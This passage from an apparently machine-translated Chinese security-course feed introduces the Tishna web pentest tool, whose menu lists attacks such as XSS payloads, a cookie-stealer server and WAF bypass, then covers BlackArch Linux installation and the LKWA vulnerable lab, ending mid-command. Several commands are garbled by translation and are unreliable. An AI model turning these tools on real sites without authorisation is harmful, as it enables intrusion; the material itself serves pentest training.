在银行，私人组织和渗透测试人员中进法律审计很有用&lt;/li&gt;&lt;li&gt;它是一种防御工具，可找到尽可能多的信息以获得未授权访问和入侵&lt;/li&gt;&lt;li&gt;随着更先进技术的出现，黑客还发现了进入许多组织系统的更多方法&lt;/li&gt;&lt;li&gt;Tishna 软件可以审核，服务器和 Web 行为&lt;/li&gt;&lt;li&gt;Tishna 可以执行尽可能多的目标扫描和枚举&lt;/li&gt;&lt;li&gt;这是通过保护服务器和 Web 应用程序安全性来阻止网络罪犯的第一步&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;功能&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;信息收集&lt;/li&gt;&lt;li&gt;XSS 分析&lt;/li&gt;&lt;li&gt;CSRF 分析&lt;/li&gt;&lt;li&gt;绕过&lt;/li&gt;&lt;li&gt;......&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;安装&lt;/h2&gt;&lt;p&gt;&lt;b&gt;环境：Kali Linux&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;下载：&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/haroonawanofficial/Tishna-Automated-Web-Application-Hacker&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/haroonawanof&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ficial/Tishna-Automated-Web-Application-Hacker&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;然后在目录下执行命令，来提高所有 bash 文件的访问级别。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;chmod u + x * .sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后安装命令，进入安装流程：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./kali_install.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;644&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;644&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;可工具扫描选项前的编号进行，例如，扫描 LFI 漏洞，键入编号 55 再进行相关配置即可。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;873&quot; data-rawheight=&quot;684&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;873&quot; data-original=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;873&quot; data-rawheight=&quot;684&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;873&quot; data-original=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;视频安装教程：&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//youtu.be/93ws50zYqVE&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;youtu.be/93ws50zYqVE&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;命令选项&lt;/h2&gt;&lt;blockquote&gt;[1]审核HTTP方法&lt;br/&gt;[2]提取响应标头&lt;br/&gt;[3]提取图像&lt;br/&gt;[4]提取URL&lt;br/&gt;[5]识别表单&lt;br/&gt;[6]在表单高级攻击中查找XSS &lt;br/&gt;[7]在表单简单攻击中查找XSS&lt;br/&gt;[8] Web服务器挂载响应拆分攻击&lt;br/&gt;[9]标头注入毒药&lt;br/&gt;[10]高速缓存毒药&lt;br/&gt;[11] CRLF响应拆分攻击和模糊器&lt;br/&gt;[12] HTTP响应走私模糊&lt;br/&gt;[13] Web缓存欺骗攻击检查&lt;br/&gt;[14] HTTP方法信息&lt;br/&gt;[15]自定义CSRF注入请求&lt;br/&gt;[16]加载CSRF HTML模板&lt;br/&gt;[17] Shell Shock&lt;br/&gt;[18]跨站点请求伪造审核工具包&lt;br/&gt;[19]查找可用的HTTP方法&lt;br/&gt;[20]使用尖叫眼镜蛇在参数中查找XSS&lt;br/&gt;[21]查找缺少的HTTPS方法&lt;br/&gt;[22]服务器端请求伪造&lt;br/&gt;[23]查找可用的HTTPS方法&lt;br/&gt;[24]审核XML RPC方法，提取所有信息&lt;br/&gt;[25] Cookie Stealer XSS Localhost服务器&lt;br/&gt;[26]命令注入漏洞&lt;br/&gt;[27]显示JSON端点列表 &lt;br/&gt;[28]执行盲注，编码的响应式XXE注入 &lt;br/&gt;[29]执行文件上传注入 &lt;br/&gt;[30]执行侧面模板注入 &lt;br/&gt;[31]执行JSON Web令牌注入 &lt;br/&gt;[32]执行Web套接字注入 &lt;br/&gt;[33]执行Amazon Bucket Injection 101 AWS亚马逊&lt;br/&gt;[34]提取要劫持的Cnames记录 &lt;br/&gt;[35]不安全的直接对象参考– BURP &lt;br/&gt;[36]执行CSV注入 &lt;br/&gt;[37]执行XPATH注入 &lt;br/&gt;[38]查找SQL，XPATH，ASP，X，JAVA，JAVASCRIPT，PHP错误 &lt;br/&gt;[39]查找XPath和SQL参数注入 &lt;br/&gt;[40]显示两个身份验证有效载荷 &lt;br/&gt;[41]突变的XSS有效载荷 &lt;br/&gt;[42]存储的XSS有效载荷 &lt;br/&gt;[43]反射的XSS有效载荷 &lt;br/&gt;[44] Waf旁路有效载荷 &lt;br/&gt;[45]使用响应分割查找XSS &lt;br/&gt;[46]提取链接–高级 &lt;br/&gt;[47]下载图像– Exif数据 &lt;br/&gt;[48]简单响应拆分攻击 &lt;br/&gt;[49]双响应拆分攻击 &lt;br/&gt;[50] HTTP缓存中毒攻击 &lt;br/&gt;[51] HTTP缓存注入中毒 &lt;br/&gt;[52] HTTP Fuzzer &lt;br/&gt;[53] IP混淆 &lt;br/&gt;[54] RFI &lt;br/&gt;[55] LFI &lt;br/&gt;[56]二进制缓冲区溢出查找器 &lt;br/&gt;[57]存储和反映的XSS Angular JS有效 负载&lt;br/&gt;[58] Phantom JS XSS有效负载帮助程序 &lt;br/&gt;[59] Agular JS客户端自动XSS查找器 &lt;br/&gt;[60]会话劫持 打扰方法&lt;br/&gt;[61] OAUTH注入 &lt;br/&gt;[62]使用DNS历史记录绕过防火墙 &lt;br/&gt;[0]退出&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-15-102917681</guid>
<pubDate>Wed, 15 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>集上千种工具于一体：BlackArch Linux（2020最新版）</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-14-102716285.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102716285&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cedfb1007dcb813ed8c4bdc300b6fd00_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;BlackArch Linux 是一个基于 Arch Linux 的渗透测试发行版，面向渗透测试人员和安全研究人员。存储库包含2428个工具。可以单独或成组安装工具。BLACKARS Linux与现有的Arch安装兼容。&lt;/p&gt;&lt;p&gt;官网：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/tools.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/tools.htm&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1500&quot; data-rawheight=&quot;800&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1500&quot; data-original=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1500&quot; data-rawheight=&quot;800&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1500&quot; data-original=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;BlackArch Linux 2020版&lt;/h2&gt;&lt;p&gt;像 kali 一样，让渗透测试人员专心干事情的工具集，累计 2400+ 工具，几乎满足日常任何渗透需求。（其目标就是取带 kali 成为新一代传奇，当然，目前显然超越了诸如Kali Linux之类的系统）&lt;/p&gt;&lt;p&gt;&lt;b&gt;下载&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//mirrors.tuna.tsinghua.edu.cn/blackarch/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https：// mirrors .tuna.tsinghua.edu.cn / blackarch /&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;2. &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//mirrors.ustc.edu.cn/blackarch/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;mirrors.ustc.edu.cn/bla&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ckarch/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;更新内容&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;增加了 120 个新工具&lt;/li&gt;&lt;li&gt;向 lxdm 添加终端字体支持&lt;/li&gt;&lt;li&gt;修正了“无法通过菜单打开工具”的 bug&lt;/li&gt;&lt;li&gt;将 blackarch 安装程序更新为 v1.1.34&lt;/li&gt;&lt;li&gt;包括 linux 内核 5.4.6&lt;/li&gt;&lt;li&gt;更新的 urxvt 配置：添加对动态更改大小的支持&lt;/li&gt;&lt;li&gt;用 Vundle.vim 替换 vim。添加了新的 vim 插件：clang_complete&lt;/li&gt;&lt;li&gt;对所有包进行了质量保证和修复（运行时执行）&lt;/li&gt;&lt;li&gt;更新了所有 blackarch 工具和包，包括配置文件&lt;/li&gt;&lt;li&gt;更新了所有系统包&lt;/li&gt;&lt;li&gt;更新了所有窗口管理器菜单（awesome、fluxbox、openbox）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;安装（在ArchLinux之上安装）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;它充当非官方的用户存储库。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;＃以 root 身份运行 https://blackarch.org/strap.sh 并按照说明进行操作。
$ curl -O https://blackarch.org/strap.sh ＃SHA1的总和应该匹配：9f770789df3b7803105e5fbc19212889674cd503trap.sh
$ sha1sumtrap.sh ＃设置执行
$ chmod + xtrap.sh ＃运行trap.sh
$ sudo ./strap.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在可以从 blackarch 存储库安装工具。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;＃要列出所有可用工具，请运行
$ sudo pacman -Sgg | grep blackarch | 切-d&amp;#39;&amp;#39;-f2 | 排序-u＃要安装所有工具，请运行
$ sudo pacman -S blackarch＃要安装一类工具，请运行
$ sudo pacman -S blackarch- &amp;lt;类别&amp;gt;＃要查看blackarch类别，请运行
$ sudo pacman -Sg | grep blackarch
＃注意-安装blackarch工具时，可能有必要覆盖某些软件包。如果
＃遇到“failed to commit transaction”错误，请使用--needed和--overwrite开关
＃例如：
sudo pacman -Syyu --needed blackarch --overwrite=&amp;#39;*&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;作为替代安装方法的一部分，您可以从源代码构建blackarch软件包。可以在github上找到PKGBUILD 。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/BlackArch/blackarch&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/BlackArch/bl&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ackarch&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;＃首先，您必须安装 blackman。如果您的计算机上安装了 BlackArch 软件包存储库，则
＃您可以像这样安装 blackman：
$ sudo pacman -S布莱克曼＃下载，编译和安装软件包：
$ sudo blackman -i &amp;lt;程序包&amp;gt;＃下载，编译和安装整个类别
$ sudo blackman -g &amp;lt;组&amp;gt;＃下载，编译和安装所有BlackArch工具
$ sudo blackman -a＃列出blackarch类别
$ blackman -l＃列出类别工具
$ blackman -p &amp;lt;类别&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;ISO上安装&lt;/b&gt;&lt;/p&gt;&lt;p&gt;可以使用 Live 或 Netinstall 介质安装 BlackArch Linux（程序包和环境）。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;＃安装 blackarch-install-scripts 软件包
$ sudo pacman -S blackarch-install-scripts＃现在，您可以运行并按照说明进行操作
$ sudo blackarch 安装&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;详细安装：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/blackarch-install.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/blackarch&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;-install.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;VM安装教程&lt;/b&gt;：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//thewhiteh4t.github.io/2020/01/03/How-to-Install-BlackArch-Linux-in-VMWare-Workstation-15.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;thewhiteh4t.github.io/2&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;020/01/03/How-to-Install-BlackArch-Linux-in-VMWare-Workstation-15.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;完整工具列表&lt;/b&gt;：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/tools.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/tools.htm&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1168&quot; data-rawheight=&quot;1051&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1168&quot; data-original=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1168&quot; data-rawheight=&quot;1051&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1168&quot; data-original=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;安装后的默认帐号密码&lt;/b&gt;&lt;/p&gt;&lt;p&gt;帐号：root&lt;/p&gt;&lt;p&gt;密码：blackarch&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-14-102716285</guid>
<pubDate>Tue, 14 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>“鲜为人知”的web攻击靶场：LKWA</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-13-102536299.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102536299&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a5228b41200835be44afc1c60763dead_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;就像标题所说，这是一个不同寻常的 web 攻击靶场，包含了 8 种鲜为人知的 web 攻击方式，常见的 XSS 漏洞在这里就没有了。&lt;/p&gt;&lt;p&gt;例如跨站点脚本包含（XSSI），PHP 对象注入（简单注入，cookie，对象引用），PHAR反序列化，SSRF 和变量 variable。&lt;/p&gt;&lt;h2&gt;LKWA&lt;/h2&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/weev3/LKWA&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/weev3/LKWA&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1861&quot; data-rawheight=&quot;957&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1861&quot; data-original=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1861&quot; data-rawheight=&quot;957&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1861&quot; data-original=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;docker 一键搭建&lt;/h2&gt;&lt;p&gt;&lt;b&gt;环境&lt;/b&gt;&lt;/p&gt;&lt;p&gt;win10&lt;/p&gt;&lt;p&gt;先下载项目到本地：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/weev3/LKWA&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/weev3/LKWA&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;使用它自带的 docker-compose 进行构建（跳转到项目目录下）&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker-compose 